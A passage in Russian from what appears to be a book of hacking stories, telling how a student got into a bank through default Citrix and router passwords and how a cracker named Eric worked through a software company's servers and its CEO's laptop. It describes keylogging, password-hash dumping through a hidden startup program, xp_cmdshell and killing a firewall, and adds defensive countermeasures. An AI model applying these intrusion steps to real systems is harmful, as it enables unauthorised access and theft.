что ты за мной наблюдаешь!». «Я мгновенно вышел из компьютера». В другой раз были зафиксированы файлы, которые он просматривал. «Они уничтожили их и послали мне такое письмо — „ ВЫ БУДЕТЕ НАКАЗАНЫ ПО ВСЕЙ СТРОГОСТИ ЗАКОНА“.   ВЗЛОМ   БАНКА   Когда Габриэль бродил по Интернету, собирая сведения об IP-адре-се банка Dixie, он обнаружил след, который показал, что это не маленький банк, а крупный с большим числом национальных и интернациональных связей. Еще более интересным было то, что на серверах банка работали приложения Citrix MetaFrame, то есть ПО для сервера, которое позволяет пользователю удаленно управлять его рабочей станцией. На основании прежнего опыта Габриэлю и его другу стало ясно, что здесь может произойти что-то интересное. «Мы с моим другом обнаружили, что большинство систем, использующих серверы Citrix, не имеют хорошего пароля. Они поставляются готовыми к использованию, но без пароля для конечного пользователя».  Габриэль начал работать с портативным сканером, специальным хакерским средством (или средством аудита, в зависимости от склонностей пользователя), которое сканирует другие сетевые компьютеры, чтобы обнаружить открытые порты. Он направленно искал системы с открытым портом 1494, поскольку именно этот порт используется для удаленного доступа к терминальным сервисам Citrix. Поэтому любая система с открытым портом 1494 являлась его потенциальным «владением».  Как только он находил то, что его интересовало, он исследовал каждый файл на компьютере на наличие слова «password». Все это похоже на работу старателей, ищущих золото. Большую часть времени вы промываете пустую породу, но иногда набредаете на самородок. В данном случае таким самородком могла быть невинная запись в каком-то файле «пароль администратора для mail2 — „happyday“».  Таким образом он обнаружил пароль для межсетевого экрана банка. Он попробовал соединиться с маршрутизатором, зная, что чаще всего на них остаются изначально установленные пароли «admin» или «administrator», поскольку пользователи — бесхитростные сотрудники и даже ИТ-профессионалы — начинают использовать новое устройство, даже не задумываясь о том, чтобы сменить этот пароль. Именно это и обнаружил Габриэль — маршрутизатор с изначальным паролем.  После того, как он получил доступ, он добавил в межсетевой экран специальное правило, разрешающее соединяться с портом 1723 — этот порт предназначен для услуг виртуальной частной сети V P N Microsoft, которая обеспечивает безопасное соединение авторизованных пользователей с корпоративной сетью. После того, как он успешно авторизовался в VPN-услугах, его компьютер получил доступ к IP-адресу во внутренней сети банка. К счастью для него, сеть была «гладкой», то есть все системы ее доступны из любого сегмента сети, так что хакер, проникший в один компьютер, получает доступ ко всем другим компьютерам этой сети.  Проникновение в сеть банка, говорит Габриэль, было настолько простым, что «даже стыдно об этом говорить». Банк однажды пользовался услугами целой группы консультантов в области безопасности, которые оставили серьезный отчет о своей работе. Габриэль обнаружил этот конфиденциальный отчет на сервере. Он содержал подробный список всех лазеек, которые обнаружили эксперты — и был прекрасным руководством по захвату сети.  В качестве сервера банк использовал компьютер IBM AS/400, с которым Габриэль еще не встречался. Тем не менее, он нашел на Windows сервере домена полное руководство для приложений, используемых этой системой, которое он и перекачал себе. Когда он напечатал в качестве пароля «administrator» (пароль, используемый на сервере IBM по умолчанию), система впустила его.  «По-моему, девяносто девять процентов людей, работающих на этом компьютере, использовали пароль „password123“. У них не было и антивирусной программы, которая постоянно работала бы в фоновом режиме. Они запускали ее не чаще, чем раз в неделю».  Габриэль спокойно установил программу Spy Lantern Keylogger, любимую им за ее уникальную способность записывать информацию одновременно о любом количестве пользователей, работающих на сервере Citrix. После этого Габриэль стал ждать, когда в систему войдет администратор, чтобы перехватить его пароль.  Вооруженный всеми паролями, Габриэль получал в свое распоряжение доступ ко всем руководствам по использованию приложений на сервере AS/400. Он получил возможность делать все то. что делает кассир — иметь доступ к наличности, просматривать и изменять информацию о счетах пользователей, проверять активы банка и его перечисления, иметь доступ к системе Equifax для кредитов. Он обнаружил также, что с сайта банка он может получить доступ к компьютерной базе данных государственного Департамента автомобилей.  Далее он решил получить всю «мешанину» зашифрованных паролей первичного контроллера доменов (PDC — primary domain controller), который авторизует любой вход в домен. Для этого он выбрал программу PwDump3, которая извлекает все пароли из защищенной части регистра системы. Он получил доступ с привилегиями администратора к компьютеру, затем добавил текст для исполнения PwDump3 в стартовую программу, замаскировав ее под что-то безвредное. (На самом деле он мог избежать этих действий, если бы извлек последние десять паролей из регистра, хотя эти пароли могли принадлежать и обычным пользователям).  Габриэль ожидал, пока администратор домена войдет в машину, за которой он следил. Его программа работала, как ловушка, проявляясь только при определенном событии — в данном случае при входе в систему сисадмина. Когда администратор входит в машину, его зашифрованный пароль тихо копируется в файл. Программа PwDump3 работает из папки администратора. «Иногда приходится ждать нужного момента (входа администратора) по нескольку дней, — говорит Габриэль — Но овчинка стоит выделки».  Когда ничего не подозревающий администратор вошел в машину, его пароль незаметно скопировался в спрятанный файл. Габриэль вернулся к работе, получил зашифрованный пароль и запустил программу для его расшифровки, используя самый мощный компьютер, к которому мог получить доступ.  При таком методе работы расшифровка самого простого пароль типа «password» занимает секунды. Пароли для Windows тоже расшифровываются также достаточно быстро, а сложные пароли с использованием специальных символов могут занять достаточно много времени. «Один такой я расшифровывал целый месяц», — грустно вспоминает Габриэль. Пароль администратора банка состоял всего из четырех строчных букв. На его расшифровку ушло времени меньше, чем вы потратили на чтение этого параграфа.   КОГО  -  ТО   ИНТЕРЕСУЕТ   ИНФОРМАЦИЯ О   ШВЕЙЦАРСКОМ   БАНКЕ  ?   Некоторые из находок Габриэля были столь впечатляющи, что на их фоне остальные казались ничтожными горошинами.  Он отыскал путь для проникновения в самые т а й н ы е недра банковских операций — процесс переводов. Он обнаружил меню для запуска этого процесса. Он также обнаружил онлайновую форму, которую заполняют авторизованные сотрудники для того, чтобы переводить деньги со счетов пользователей на другие счета (возможно даже в швейцарских банках).  Однако пустая форма не имеет смысла до тех пор, пока вы не умеете правильно заполнить ее. Оказалось, что и это — не проблема. В руководстве, которое он себе уже сгрузил, особенно интересной была одна из глав. Ему не пришлось углубляться в нее, он быстро нашел все, что требовалось.   20.1.2 Ввод/обновление передачи сведений по проводам  Меню: передача сведений (Wires)  Функция: ввести/обновить передачу сведений   Эта возможность используется для входа в неповторяемые линии и выбора повторяемых линий. Неповторяемые линии предназначены для тех пользователей, которые редко осуществляют переводы или для тех, кто не является пользователем, но хочет совершить перевод. С помощью этой функции, входящие линии также могут использоваться после разгрузки. Когда выбрана эта функция, появляется такой экран.   Wire transfers  Wire transfers 11:35:08  Outgoing  Type options, press Enter.  2=Change, 4=Delete, 5=Display Position to …  Opt From account To beneficiary Amount  F3=Exit F6=Add F9=Incoming F12=Previous   Когда эта функция используется впервые, линии еще не выбраны. Чтобы сделать это нажмите F6=Add и появится следующий экран.  Целая глава была посвящена подробному изложению — шаг за шагом — процедуры для установки линии связи, чтобы передать по ней средства из данного банка какому-то человеку или другой финансовой организации. Теперь Габриэль знал все необходимое для того, чтобы осуществить такой перевод. Он получил в свои руки «ключи от замка».   ПОСЛЕДСТВИЯ   Несмотря на совершенно неограниченный доступ к системе банка и огромные возможности, Габриэль не воспользовался всем этим. В его планы не входило красть деньги или портить какую-то банковскую информацию, хотя у него и была идея повысить кредитный рейтинг двух своих приятелей. Будучи всего-навсего студентом, изучающим системы безопасности в местном колледже. Габриэль смог нащупать слабости в системе безопасности банка.  «На их сервере я нашел массу документов об их системе физической безопасности, но ни слова о хакерах. Я нашел сведения о том, что банк приглашает консультантов по безопасности каждый год, но этого явно недостаточно. Они делают неплохую работу по выявлению брешей в физической безопасности, но совершенно недостаточно —в сфере компьютерной безопасности».   АНАЛИЗ   Сайт эстонского банка — это легкая мишень. Юхан обнаружил бреши в защите, когда он просматривал коды программ Интернет-сайта банка. Они использовали скрытые параметры, которые содержали имена файлов форм, которые загружались текстом CGI и показывались пользователям в их Интернет-браузере. Он изменил эти параметры так, чтобы они указывали на файл паролей сервера, — «раз-два», и у него на экране появился этот файл паролей. Удивительно, что это файл не был замаскирован, поэтому он получил доступ ко всем зашифрованным паролям, которые он впоследствии взломал.  Взлом банка « D i x i e » продемонстрировал еще один пример необходимости «глубокой зашиты». В данный момент сеть банка была гладкой; то есть, без серьезной защиты за пределами сервера Citrix. После того, как в одну из систем сети проникал атакующий, он мог соединиться с любой системой сети. Методика «глубокой защиты» могла бы помешать Габриэлю получить доступ к AS/400.  Служба безопасности банка испытывала абсолютно ложное ощущение безопасности, возникшее после внешних аудитов, которые неоправданно завысили оценку уровня их общей безопасности. Хотя проведение подобных проверок и аудитов — очень важный шаг при выяснении вашей способности противостоять атакам, еще более важным элементом является процесс правильного управления сетью и всеми работающими в ней системами.   КОНТРМЕРЫ   Повторюсь: проникновение в банк Dixie дает еще один пример необходимости «глубокой защиты». В этом случае сеть банка оказалась гладкой. После того, как в одну из систем сети проникал атакующий, он мог соединиться с любой системой сети. Методика «глубокой защиты» могла бы помешать Габриэлю получить доступ к AS/400.  Сайт онлайнового банка должен требовать, чтобы все разработчики Интернет-приложений придерживались фундаментальных правил безопасности и чтобы у них проводился аудит всех кодов. Лучше всего ограничить число пользователей, имеющих доступ к текстам на сервере. Для этого надо использовать сложные имена файлов и засекреченных констант, что естественно повысит уровень безопасности приложения.  Недостаточный контроль сети и слишком простые пароли на сервере Citrix — главная ошибка в рассматриваемом случае, именно она позволила Габриэлю свободно путешествовать по сети, устанавливать программу для записи набираемых на клавиатуре текстов, следить за другими пользователями и внедрять программы — трояны. Хакер написал небольшую программу и поместил ее в стартовую папку администратора, поэтому, когда администратор входил в компьютер, он неосознанно записал программу pwdump3. Габриэль уже имел права администратора. Хакер должен был только дождаться, когда администратор домена войдет в компьютер, после чего он мог украсть его привилегии и автоматически извлечь пароли из первичного контроллера доменов. Спрятанная программа называется трояном или «черным ходом». Вот краткий список контрмер:  • проверьте, когда изменялись пароли во всех аккаунтах, в системных приложениях, не предназначенных для персонала, без административной авторизации, без групповой авторизации и времена таких смен. Такие проверки могут выявить вторжение хакера. Посмотрите на пароли, которые были изменены в нерабочие часы, поскольку хакер может не подумать о том, что таким образом он оставляет следы, подвластные аудиту.  • Ограничьте интерактивный вход в систему рабочими часами.  • Обеспечьте аудит всех входов и выходов во все системы, доступные через беспроводной доступ, dial-up или Интернет.  • Устанавливайте такие программы как SpyCop (доступные на сайте  http://www.spycop.com  ). которые помогают обнаружить неавторизованные программы для отслеживания работы клавиатуры.  • Тщательно устанавливайте все обновления систем безопасности. В некоторых случаях самые последние версии можно загрузить автоматически. Компания Microsoft настоятельно советует своим пользователям сконфигурировать свои компьютеры так, чтобы иметь возможность сделать это.  • Проверяйте системы, доступные извне, на наличие программ удаленного управления, таких, как WinVNC, TightVNC, Danware и т.п. Эти программы позволяют атакующему «мониторить» системы, работающие на компьютере и даже управлять ими.  • Тщательно проверяйте все входы с использованием Windows Terminal Services или Citrix MetaFrame. Большинство атакующих предпочитают использовать эти сервисы для удаленного управления программами, чтобы снизить риск быть обнаруженным.   ПОСЛЕСЛОВИЕ   Хакерские попытки, описанные в этой главе, тривиальны, они основаны на слабых паролях и уязвимых CGI-текстах. В то время как многие люди, даже осведомленные о компьютерной безопасности, думают о вторжении хакеров, как о какой-то экзотике со стратегической подготовкой типа фильма «11 друзей Оушена», грустная правда заключается в том. что большинство атак не являются ни талантливыми, ни даже просто умными. Они успешны лишь потому, что большая часть корпоративных сетей не защищена адекватным образом.  Кроме того, люди, ответственные за разработку и развертывание таких систем, делают простые ошибки в их конфигурировании, что дает возможность тысячам хакерам проникать в них буквально с парадного входа каждый день.  Если бы оба финансовых учреждения, о которых идет речь в этой главе, были типичным примером того, как большинство банков в мире защищает сведения о клиентах и их счетах, тогда, скорее всего, все мы вернулись бы к хранению денег в обувных коробках под кроватями.       Глава 8.    Ваша   интеллектуальная   собственность не   в   безопасности      Если какой-то прием не работает, я пробую что-то еще, поскольку я знаю: что-нибудь обязательно сработает. Что-нибудь всегда срабатывает. Надо просто найти, что.      Эрик   Что самое ценное в любой компании? Это не компьютеры, не помещения или фабрики, это даже не то, что стало модным клише в некоторых корпорациях: «Наши самые ценные активы — это наши люди».  На самом деле все, что перечислено, может быть заменено. Не так просто, не без борьбы, но практически любая компания выживет после того, как сгорит фабрика или несколько ключевых сотрудников покинут ее пределы. А вот выжить после потери интеллектуальной собственности — это совсем другая история. Если кто-нибудь украдет конструкцию ваших продуктов, список клиентов, план выпуска новых товаров, результаты исследовательских работ — это будет катастрофа для компании.  Более того, если кто-то украдет хоть тысячу продуктов с вашего склада, тонну титана с производства или сотню компьютеров из офиса, вы сразу же узнаете об этом. Если кто-нибудь украдет вашу интеллектуальную собственность электронным образом, то есть, скопирует ее, вы никогда об этом не узнаете или узнаете, когда почувствуете последствия этой кражи.  Шокирующей новостью для вас может стать тот факт, что люди с хакерскими навыками крадут интеллектуальную собственность каждый день, часто из компаний, которые думают о безопасности не меньше, чем вы, о чем и рассказывается в этой главе.  Два героя двух следующих историй принадлежат к особой хакерской ветви под названием «кракеры», — так называют хакеров, которые взламывают программы при помощи реинжиниринга коммерческих приложений или простой кражи кодов этих приложений или лицензированных кодов, так что они могут использовать эти программы бесплатно и распространять их через лабиринт тайных кракерских сайтов. (Не надо их путать с программами «кракерами» для взлома паролей).  У кракеров есть три главных мотива для погони за определенным продуктом:  • Получить программу, которая их интересует, для пристального изучения.  • Принять вызов, чтобы понять, сможет ли он превзойти конкурента (обычно разработчика), — аналогично тому, как игроки стремятся превзойти оппонента за шахматной доской, в бридже или за покерным столом.  • Разместить программное обеспечение в Интернете, чтобы оно стало доступным другим обитателям виртуального мира бесплатно. Кракеры взламывают не только программы, но также и коды, используемые для создания лицензированных ключей.  Оба героя наших историй взламывают сайты производителей ПО, чтобы украсть у них коды программ и распространить их ключевые элементы в группах кракеров, чтобы они могли использовать это ПО бесплатно. Есть много людей с хакерскими способностями, которые занимаются тем же, и есть производители программ, которые не представляют, какой вред наносят им хакеры.  Кракеры существуют в темном, надежно спрятанном мире, где валютой является украденная программа — масштабы кражи интеллектуальной собственности могут ужаснуть любого нормального человека. Потрясающий последний акт этой истории подробно описан в конце главы в разделе «Распределение: мир кракеров».  Истории в этой главе сильно адаптированы для обычных читателей.   ДВУХЛЕТНЕЕ   ХАКЕРСТВО   Эрик — тридцатилетний консультант по безопасности. Он жалуется: «Когда я сообщаю об уязвимости, я часто слышу: «Это ерунда.  Что за проблема? Какой от этого вред?». Его рассказ хорошо иллюстрирует часто забываемый трюизм: обычно люди гибнут от небольших ошибок.  Надо предупредить, что эта история может показаться людям с недостаточным знанием технического арсенала хакеров слишком трудной для восприятия. Это — некая хроника, описывающая трудовые будни кракеров. То, о чем здесь рассказывается, произошло совсем недавно. Итак, Эрик, как и многие другие герои этой книги, днем работает консультантом, который помогает бизнесу защитить свои информационные активы. Но зато ночью он превращается в хакера, проникающего в самые неожиданные места.  Эрик принадлежит к специальному типу хакеров, которые стремятся к цели с невероятным упорством и никогда не бросают своих попыток, даже если они  занимают месяцы или годы.    РАБОТА   НАЧИНАЕТСЯ   Несколько лет назад Эрик и еще несколько хакеров собирали различные типы программ и, в конце концов, достигли такого состояния. когда они стали «собственниками кодов» всех основных программ с одним единственным исключением. «Это была последняя программа, которой у меня не было, — объясняет Эрик, — и я не знаю почему, но мне было просто суперважно добраться до нее». Я прекрасно понимаю эту его страсть. Эрик в душе — охотник за трофеями и чем ценнее программа, тем крупнее трофей.  Это задача заводила Эрика больше, чем он мог признаться себе. «Есть несколько сайтов, на которые я хочу попасть, но они действительно трудны по некоторым причинам», — просто объясняет он. Я могу понять и эту его эмоцию.  Он начал обычным способом, « с о сканирования портов на Интернет-сервере, — это первое место, куда я заглядываю, когда пытаюсь проникнуть на Интернет-сервер. Обычно там есть много интересного. Но на этот раз я не мог ничего найти». Начиная атаку, хакеры обычно подбираются к мишени осторожно, чтобы избежать сигналов тревоги и не быть замеченными администратором. Это особенно актуально в наши дни, когда многие компании пользуются системами обнаружения вторжения, чтобы заметить сканеры портов и другие типы хакерских инструментов, которыми обычно пользуются атакующие.  Эрик: «Я искал несколько портов, которые должны были стать для меня интересными мишенями». Он охотился на список номеров портов, которые используются для Интернет-сервера, терминальных сервисов, Microsoft SQL-сервера, Microsoft VPN. NetBIOS, почтового сервера (SMTP) и других целей.  На сервере Windows, порт 1723 (как отмечалось в главе 7) обычно используется для протокола, известного, как туннель «точка-точка», который является реализацией V P N компанией Microsoft и использует авторизацию на базе Windows, Эрик вспоминал, что пробуя порт 1723, он «понял, какую роль играет сервер».  Он даже не пытался скрывать свою личность на этом этапе, поскольку «компании так часто подвергаются сканированию в наши дни, что на это никто не обращает внимания. Одно сканирование среди сотни тысяч таких же ничего не значит».  (Оценка Эриком невысокой степени риска быть обнаруженным и идентифицированным базируется на его авантюрном предположении, что это сканирование портов будет похоронено в «шуме» современного Интернета. Действительно, сетевой администратор компании-мишени может быть слишком загруженным или ленивым для того, чтобы проверять все записи об активности в сети, но всегда есть шанс, что он займется именно этим. Более осторожные хакеры стремятся не рисковать даже в такой малости).  Несмотря на весь риск, в этом случае сканирование портов не выявило ничего полезного. Далее, используя стандартную программу. которая работала как сканер CGI (common gateway interface), он обнаружил log-file, созданный W SFTP-cepвepом , который содержал, кроме всего прочего, список имен файлов, загружаемых на сервер. Он был аналогичен любым другим распечаткам работы FTP-серве-ров, говорит Эрик, «за исключением того, что этот список хранился в каждой директории, файлы которой были загружены», так что, когда вы видели имя файла в списке, который выглядел интересно, то он находился именно здесь — вам не надо было охотиться за ним.  Эрик проанализировал FTP-записи и обнаружил имена файлов, которые были загружены в директорию «/include», где обычно хранились файлы типа «.inc» — программные функции общего типа, которые взяты из других модулей кодов. В Windows 2000 по умолчанию эти файлы не были защищены. После тщательного просмотра списка файлов в log Эрик использовал свой Интернет-браузер, чтобы просмотреть коды в некоторых файлах, которые, по его мнению, могли содержать важную информацию. Специальное внимание он уделял файлам, которые могли содержать пароли резервного сервера баз данных. И случайно он наткнулся на нечто интересное.  «В тот момент», — вспоминает Эрик, — «я уже сделал десяток запросов на Интернет-сервер и ничего не мог там найти». Хотя находка паролей базы данных и была восхитительной, он быстро понял, что на этой машине нет сервера баз данных.  С этого момента ситуация стала «интересной».  «Я ничего не мог найти на том сервере, но у меня была специальная программа, которая перебирала возможные имена узлов на основе списка общеупотребительных имен узлов — как gateways, backup, test и т.д. плюс имя домена. Она перебирала список общеупотребительных имен узлов, чтобы убедиться, какие имена узлов существуют в этом домене.  Люди очень предсказуемы в выборе имен узлов, поэтому очень просто найти серверы».  Отыскать серверы было просто, но это по-прежнему не привело его никуда. Затем его озарило: компания расположена не в США. Поэтому «я начал добавлять в конце расширения различных стран и опять перепробовал все названия узлов, которые уже отыскал при помощи моего сканирующего средства». Например, для японской компании это выглядело бы так:   hostname.companyname.com.jp   Это позволило ему отыскать сервер архивирования и почтовый сервер. Он попал на них с помощью паролей, которые он обнаружил в файлах источников (.inc) в «include». Пароль для сервера Microsoft SQL был найден в директории администратора ( « s a » ) . Он смог выполнять команды при помощи стандартной процедуры (x pcmdshell) , которая позволяла ему запускать shell-команды там, где работал SQL-сервер, обычно в привилегированном режиме. И — удача! Это дало ему полный доступ к Интернет/почтовому серверу.  Эрик немедленно начал рыться в директориях в поисках копий кодов и других ценностей. Его главной целью было найти очень секретную программу, используемую для производства лицензионных ключей для пользователей, которая обычно называется генератором ключей или «keygen». Сначала надо было собрать как можно больше информации о системе и ее пользователях. Все собранные интересующие его сведения Эрик записывал в таблицу Excel, где классифицировал пароли, IP-адреса, имена узлов, какие сервисы были доступны через открытые порты и т.д.  Он также заглядывал и в такую скрытую часть операционной системы, которую неопытные хакеры обычно пропускают, как LSA-секреты, где содержатся сервисные пароли, пароль последнего пользователя, входившего в компьютер, RAS-имена (Remote Access Services — услуги удаленного доступа) для dial-up, пароли рабочих станций, используемые для доступа в домен и многое другое. Он также просмотрел и защищенную область для хранения данных, где хранились пароли для Internet Explorer и Outlook Express.  Сначала он извлек «мешанину» паролей, и, расшифровав их, восстановил. Поскольку сервер был одновременно резервным контроллером домена, почтовым сервером и вторичным DNS-сервером, Эрик получил доступ ко всем записям обо всех DNS-pecypcax, (включая, среди прочего, имена узлов и соответствующие IP-адреса), открыв панель управления DNS. которая содержала подробный список имен узлов и доменов, используемых в компании.  «Теперь у меня был список всех их узлов, и я собирал пароли к ним тут и там, перескакивая из системы в систему».  Подобные «скачки» были возможны благодаря его предыдущим успехам в расшифровке паролей на backup Интернет-сервере после использования пароля Microsoft SQL, который он нашел.  Он до сих пор не знал, на каком сервере разрабатываются приложения, хранятся коды программ и лицензируемые коды управления. В поисках подсказки он тщательно просматривал все письма и записи о работе в Интернете, чтобы найти там хоть какой-то намек. Однажды он нашел список других IP-адресов из распечатки, которая выглядела интересно, тогда он решил атаковать этот компьютер. Его «Священным Граалем» на этом этапе была рабочая станция разработчиков, поскольку любой разработчик всегда хотел бы иметь доступ ко всему набору файлов кодов.  После этого он решил затихнуть на несколько недель. Собрав коллекцию паролей, он не находил ничего интересного в течение нескольких месяцев, «только незначительные порции информации. которые, как я думал, будут мне полезны».   КОМПЬЮТЕР   ГЛАВЫ   КОМПАНИИ   Почти восемь месяцев он «перескакивал с одного сервера на другой», не находя ни кодов программы, ни генератора ключей. Пока, наконец, не произошел некий прорыв. Он начал более пристально изучать backup Интернет-сервер, на который он проник первым, и обнаружил, что там хранятся копии всех писем, в частности список IP-адресов и адресов электронной почты всех сотрудников. Просмотрев этот список, он смог восстановить IP-адрес главы компании (CEO — Chief Executing Officer). Наконец-то он определил действительно достойную мишень.  «Наконец-то я нашел компьютер С Е О и это было уже интересно. Несколько дней я сканировал его порты, и он не отвечал, но я был уверен, что он там. В заголовках электронной почты я видел, что он использует один IP-адрес, но его там никогда не было.  Я начал сканировать его компьютер, проверяясь каждые два ч а с а — не прощупывает ли он меня, на тот случай, если бы у него были программы для обнаружения вторжения. Я прощупывал его несколько раз в день, но ограничил число портов пятью за каждые двадцать четыре часа. Через несколько дней я нашел порт, открытый, когда он работал за компьютером. Я наконец нашел открытый порт на его машине — 1433, работающий под MS SQL-сервером. Оказалось, что это его ноутбук, который он просматривал по два часа каждое утро. Итак, он приходил к себе в офис, проверял почту и затем уходил, выключив ноутбук».   ПРОНИКНОВЕНИЕ   В   КОМПЬЮТЕР   С  Е  О   К тому времени Эрик собрал двадцать или тридцать паролей, принадлежащих компании. «У них были хорошие, сильные пароли, но они были построены по одному принципу. Однажды я понял его и раскрыл все пароли».  В этот момент Эрик осознал, что он занимается этим делом почти целый год. Только теперь его усилия увенчались успехом.  Эрик понял, что он распознал стратегию компании в области паролей, поэтому он опять вернулся к компьютеру СЕО, решив узнать его пароль. Что позволило ему надеяться на то, что он найдет пароль, который СЕО использует для MS SQL-сервера?  «Вы знаете, на самом деле я не могу этого объяснить. Это, похоже, моя способность — угадывать пароль, который выбирают люди, Я знаю даже то, какой пароль они будут использовать в будущем. У меня есть такое чувство, что я могу это знать. Это похоже на то, что я становлюсь ими и говорю, какой пароль я выбрал бы на их месте».  Он не знал, как это назвать — удачей или мастерством — поэтому закрылся формулировкой: «Я хорошо угадываю». Независимо от объяснения, он обычно узнавал правильный пароль, даже когда это было «не слово из словаря, а нечто более сложное».  Аналогичным образом он получил и пароль, который дал ему доступ к SQL-серверу в качестве администратора базы данных. СЕО был «Owned».  Он обнаружил, что компьютер хорошо защищен межсетевым экраном и лишь один порт у него открыт. Но Эрик обнаружил и немало такого, над чем он мог посмеяться. «Его система была крайне бестолковая. Я ничего не мог там найти, Я имею в виду, что там повсюду были файлы». Не зная иностранного языка, на котором там все было написано, Эрик использовал некоторые онлайновые словари и бесплатный сервис онлайнового перевода под названием «Bablefish», чтобы понять хотя бы ключевые слова. Ему помогал и его приятель, говоривший на этом языке. Из сообщений в «чатах» он смог отыскать дополнительные пароли и IP-адреса.  Поскольку файлы на ноутбуке были совершенно не организованы, и среди них невозможно было найти что-то ценное, Эрик применил другой подход, используя «dir/s/od <drive letter>», чтобы перечислить и отсортировать все файлы по датам, чтобы потом можно было обнаружить файл, недавно появившийся на диске, и проверить его в спокойной обстановке offline. В процессе такого анализа он обнаружил типичное имя для таблицы Excel, в этом файле содержались пароли для различных серверов и приложений, Из этого файла он определил имя пользователя и пароль для их первичного DNS-сервера.  Чтобы упростить свою следующую работу, укрепить почву под ногами и более легко загружать и выгружать файлы, он решил установить в ноутбуке СЕО свои хакерские программы. Он мог связываться с ноутбуком только через соединения Microsoft SQL-сервера, но мог использовать ту же процедуру, что и раньше для посылки команд в операционную систему, как если бы он находился прямо в среде Windows. Эрик написал небольшую программу, чтобы перекачать туда свои хакерские программы при помощи FTP. Когда ничего не произошло в течение трех попыток, он использовал программу со строкой прямо на ноутбуке под названием «pslist», чтобы выявить работающие там процессы.   КОЛОССАЛЬНАЯ   ОШИБКА  !   Поскольку ноутбук СЕО работал с его персональным межсетевым экраном (Tiny Personal Firewall), каждая попытка использовать FTP-протокол приводила к появлению предупредительного окошка на экране ноутбука СЕО, в котором высказывалось предложение отключиться от Интернета. К счастью СЕО уже загрузил к себе весь набор строчных команд с сайта http://www.sysinternals.com для управления процессами. Эрик использовал команду «pskill» для того, чтобы убить межсетевой экран, так что упомянутое окошко исчезло еще до того, как СЕО успел его заметить.  Затем Эрик счел разумным затихнуть на несколько недель, на тот случай, если кто-то заметил его активность. Вернувшись, он стал использовать другую тактику для попыток размещения своих программ на ноутбуке СЕО. Он написал программу для того, чтобы восстановить некоторые из своих хакерских программ, используя «Internet explorer object», что позволяет обмануть персональный межсетевой экран, поскольку тот думает, что Internet Explorer запрашивает разрешение на соединение с Интернетом. Большинство пользователей позволяют Internet Explorer свободно проходить через персональный межсетевой экран (готов спорить, что и вы тоже), и Эрик рассчитывал на то, что его программы смогут воспользоваться этим преимуществом. Правильная мысль. Она сработала. В результате он смог использовать эти программы для начала поиска нужной информации на ноутбуке.   CEO   ЗАМЕТИЛ   ПРОНИКНОВЕНИЕ   Все перечисленные методы, говорит Эрик, работают и сегодня.  Однажды, войдя в компьютер СЕО. Эрик опять убил межсетевой экран, чтобы передавать файлы на другой компьютер, откуда он смог бы перегрузить их к себе. В процессе этой работы он понял, что СЕО находится за компьютером и, должно быть, заметил что-то странное. «Вероятно, он увидел, что отсутствует значок работающего межсетевого экрана. Он понял, что я в его компьютере». Эрик немедленно отключился. Через несколько минут СЕО перезагрузил свой ноутбук и межсетевой экран опять заработал.  «Я не знаю, заметил ли он меня. Поэтому я подождал несколько недель, а потом возобновил свои попытки. Я уже изучил ритм его работы, и знал, когда могу попасть в систему».   ПОЛУЧЕН   ДОСТУП   К   ПРИЛОЖЕНИЮ   Пересмотрев свою стратегию во время вынужденного перерыва, Эрик вернулся в ноутбук СЕО и начал изучать систему более тщательно. Прежде всего он запустил общедоступную строчную команду LsaDump2, чтобы просмотреть важную информацию, хранимую в специальном разделе памяти под названием L S A (Local Security Authority) Secrets. LSA Secrets содержали пароли для служебного пользования, зашифрованные пароли последних десяти пользователей, пароли пользователя для FTP и Интернета, имена пользователей и пароли для входа в сеть через dial-up.  Он запустил и команду «netstat», чтобы увидеть, какие соединения установлены в этот момент и какие порты участвуют в соединении. Он заметил, что один из портов с большим номером ожидает входящего соединения. Соединившись с этим портом через backup-сер-вер, на который он проник раньше, он понял, что это облегченный Интернет-сервер, который используется в качестве почтового интерфейса. Он сразу же понял, что может влезть в этот почтовый интерфейс и поместить любой файл в корневую директорию сервера, используемую для почтового интерфейса. После этого он легко сможет перегружать файлы с ноутбука СЕО на backup-сервер.  Не считая незначительных успехов за прошедший год, у Эрика по-прежнему не было нужных ему кодов программы генератора ключей. Но он и не думал отказываться от своей затеи. На самом деле ситуация становилась все более интересной. «Я нашел копию директории „tools“ на ноутбуке СЕО. В ней был интерфейс к генератору ключей, но не было доступа к базе данных».  Он не нашел лицензированный сервер, на котором находилась настоящая база данных с ключами всех клиентов, были лишь некоторые намеки на него. «Я не знал, где располагаются реальные лицензированные приложения для сотрудников. Мне просто необходимо было найти этот сервер». Он подозревал, что этот сервер расположен на том же сервере, что и почтовый, поскольку у компании был Интернет-сайт, который позволял клиентам немедленно получить заказанную программу. После того, как подтверждался перевод денег с кредитной карточки клиента, тот получал электронное письмо с лицензионным ключом. Остался только один сервер, на который Эрик не мог пробраться: именно на нем и должно было храниться приложение, вырабатывающее эти лицензионные ключи.  Итак, Эрик провел месяцы в сети и не достиг поставленной цели. Он решил еще раз просмотреть backup-сервер, на который он проник раньше, и начать сканировать почтовый сервер с других серверов, которыми он уже «владел», используя более широкий диапазон портов в надежде отыскать некоторые сервисы, работающие на нестандартных портах. Он подумал, что лучше будет проводить сканирование с внутреннего сервера в случае, если межсетевой экран пропускает только определенные IP-адреса.  В течение двух следующих недель он сканировал сеть так тихо, как только возможно, чтобы идентифицировать любые сервера, на которых работают необычные сервисы или пытаясь запустить обычные сервисы на нестандартных портах.  Продолжая свою работу по сканированию портов, Эрик начал исследовать файлы с архивами Internet Explorer в директории администратора и нескольких пользователей. Это привело его к еще одному открытию. Пользователи с backup-сервера соединялись с портом с большим номером на главном почтовом сервере, используя Internet Explorer. Он понял, что главный почтовый сервер блокирует доступ к этому порту, если соединение идет не с «разрешенных» IP-адресов.  Наконец он нашел Интернет-сервер на порту с большим номером — «1800 или что-то подобное» — вспоминает он, и смог угадать комбинацию имени пользователя и пароля, которые привели его в специальное меню. Одна из возможностей этого меню заключалась в просмотре информации о клиенте. Другая — давала возможность сгенерировать лицензионный ключ для продукта.  Бинго!  Это был сервер с реальной базой данных. Эрик почувствовал выброс адреналина в кровь, поскольку он приблизился к своей цели. Но «этот сервер был очень крутым, невероятно крутым». Он опять уперся в тупик. Он отступил назад и начал тщательно продумывать каждый свой шаг, у него возникла еще одна идея.  «У меня появились коды источника этих Интернет-страниц, поскольку я нашел на ноутбуке СЕО архив этих страниц. Я нашел также линк на Интернет-страницу, где проводилась диагностика сети, такая как netstat, traceroute и ping — вы могли разместить IP-адрес на Интернет-сайте и нажать „ОК“, эта команда выполнялась, и ее результат появлялся на вашем экране».  Он заметил небольшую ошибку в программе, которая запускалась с этого И н т е р н е т — с 